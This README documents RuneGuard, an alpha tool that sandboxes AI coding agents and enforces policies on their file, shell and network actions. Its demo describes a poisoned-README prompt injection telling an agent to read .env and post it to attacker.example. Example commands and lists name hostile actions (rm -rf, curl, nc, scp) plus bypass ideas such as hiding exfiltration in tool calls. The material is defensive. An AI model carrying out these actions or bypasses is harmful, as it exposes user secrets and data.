# RuneGuard

**Runtime enforcement for AI coding agents.**

## Try it in 30 seconds
```bash
pip install runeguard
runeguard demo
```

## Or open in a Codespace
[![Open in GitHub Codespaces](https://github.com/codespaces/badge.svg)](https://codespaces.new/nzhumasseiit/runeguard)

RuneGuard v0.1.0 is an early alpha. The policy engine, demo, audit logs, and
Docker sandbox path are usable today, while Linux kernel integrations are still
experimental and platform-dependent.

RuneGuard sits between AI agents and the tools they use: files, shell commands, APIs, and network calls. Instead of only trying to make the model say safe things, RuneGuard controls what the agent is actually allowed to do at runtime.

## Problem

Coding agents are becoming powerful enough to read files, execute commands, call APIs, and move data across system boundaries.

That creates a new security problem: a prompt-injected or misaligned agent may try to access secrets, run destructive commands, or exfiltrate data.

Traditional prompt-level guardrails are not enough because the model can still attempt unsafe actions.

RuneGuard enforces policy at the action layer.

## Who this is for

RuneGuard is for developers and teams running coding agents in:

- local devboxes
- CI runners
- ephemeral sandboxes
- internal automation environments

From a checkout:

```bash
pip install -e .
```

Run the named poisoned README example:

```bash
runeguard examples poisoned-readme
```

Initialize a project policy and local RuneGuard state:

```bash
runeguard init
runeguard doctor
```

`runeguard init` creates `runeguard.yaml`, `.runeguard/`, and
`.runeguard/audit.jsonl`. The generated policy uses the Docker backend,
denies network by default, keeps the root filesystem and workspace read-only,
and grants writable mounts only for `./src`, `./tests`, and `./tmp`.

Run a command in the Docker sandbox backend, the practical default for v0.1.0:

```bash
runeguard run -- python -c "print('hello from guarded command')"
```

This mounts the current workspace at `/workspace` read-only, runs as a non-root
user, disables networking by default, drops Linux capabilities, uses a read-only
container root filesystem, adds small tmpfs mounts for `/tmp` and `/run`, and
applies simple memory/CPU/process limits.

Writable paths are opt-in through policy:

```yaml
writable_paths:
  - ".cache"
  - "tmp/output"
```

For compatibility with tools that still need a writable checkout:

```bash
runeguard run --unsafe-writable-workspace -- python build.py
```

For local development only, you can still run through the host policy wrapper:

```bash
runeguard run --backend host -- python -c "print('host policy check only')"
```

Evaluate an action without executing it:

```bash
runeguard eval read_file --path .env
runeguard eval http_post --url https://attacker.example/upload
runeguard eval shell --command "rm -rf ./project"
```

Write a JSONL audit log:

```bash
runeguard demo --audit-log .runeguard/audit.jsonl
runeguard report .runeguard/audit.jsonl --html
```

Start the policy daemon for process-level interception:

```bash
runeguard daemon start --audit-log .runeguard/daemon.jsonl
```

On Linux, build and use the LD_PRELOAD shim:

```bash
runeguard shim build
runeguard run --backend host --preload -- python -c "open('.env').read()"
```

On Linux with local build dependencies and the privileges needed to load eBPF
programs, build and run the libbpf/CO-RE loader:

```bash
scripts/install_ebpf_deps.sh
runeguard ebpf trace
```

On Linux with kernel Landlock support, run the experimental Landlock backend:

```bash
runeguard run --backend landlock -- python -c "open('README.md').read()"
```

## Demo

The demo simulates a poisoned README attack.

An agent is asked to summarize a repo. The README contains hidden malicious instructions telling the agent to read `.env` and send it to an external domain.

RuneGuard blocks the unsafe actions.

Expected output:

```text
[ALLOW] read_file({'path': 'examples/demo_repo/README.md'}) - allowed by policy
[BLOCK] read_file({'path': 'examples/demo_repo/.env'}) - protected path access
[BLOCK] http_post({'url': 'https://attacker.example/upload', ...}) - domain not allowlisted
[BLOCK] shell({'command': 'rm -rf ./project'}) - blocked shell command pattern
```

## Current Status

Working now:

- YAML policy loading
- `runeguard run -- <command>` Docker sandbox runner
- optional `runeguard run --backend host -- <command>` policy wrapper
- `runeguard eval <tool>` dry policy evaluation
- `runeguard init` stable schema v1 policy generation
- `runeguard doctor` environment and policy checks
- `runeguard report <audit.jsonl> --html` audit reports
- Unix socket policy daemon
- Linux LD_PRELOAD shim source and build target
- Linux Landlock filesystem sandbox backend, experimental and kernel-dependent
- libbpf/CO-RE eBPF source and loader interface for `execve`, `openat`, `connect`, and BPF LSM exec enforcement, experimental and requiring local Linux build
- optional OPA/Rego policy backend
- process correlation metadata in JSONL audit logs
- agent integration helpers
- file access policy
- shell command policy
- network/domain policy
- readable allow/block logs
- JSONL audit logs
- poisoned prompt demo

Planned:

- Docker/Podman hardening
- signed release artifacts
- deeper eBPF policy map enforcement beyond the current loader interface
- CI/devbox sandbox mode

## v0.1.0 Test Surface

This repo is ready for early breakage and feedback around the policy layer.

Useful things to try:

- path bypasses around `.env`, `secrets/`, `~/.ssh/`, relative paths, and nested directories
- shell bypasses around blocked tokens such as `rm -rf`, `curl`, `nc`, and `scp`
- URL/domain bypasses around subdomains, missing schemes, and attacker-controlled hosts
- LD_PRELOAD bypasses on Linux, especially static binaries, direct syscalls, and alternate libc paths
- daemon failure behavior with `RUNEGUARD_FAIL_CLOSED=0` versus the default fail-closed mode
- places where audit logs leak data that should be redacted
- places where the README implies stronger security than the code actually provides

## Vision

RuneGuard is a runtime permission layer for AI agents.

The long-term goal is to create a real boundary between agent intent and system truth: what the model says it will do versus what the system actually observes and allows.

## Security Boundary

The policy/proxy modes are not a hard security boundary. They are useful when
agent tool calls are routed through RuneGuard, but they cannot stop actions that
avoid those routes.

The LD_PRELOAD shim is experimental and bypassable by static binaries, direct
syscalls, and processes that do not load the shim.

The Docker sandbox mode is the practical default backend in v0.1.0: it gives
RuneGuard a real process boundary with non-root execution, an isolated container
filesystem view, network denial by default, and resource limits.

Landlock is Linux-only, depends on kernel support, and is experimental.

The eBPF layer uses libbpf/CO-RE source and a standalone loader interface. Its
enforcement mode can deny configured executable names through BPF LSM, but it
depends on Linux BPF LSM support, local compilation, and the privileges required
by the host. It is not the main filesystem enforcement layer; use Docker or
Landlock for filesystem controls.

## Try To Break It

Ideas:

- make the agent read `.env`
- make it run `curl`, `nc`, or `scp`
- make it hide exfiltration inside a normal tool call
- make it access `~/.ssh`
- make the audit log expose something sensitive
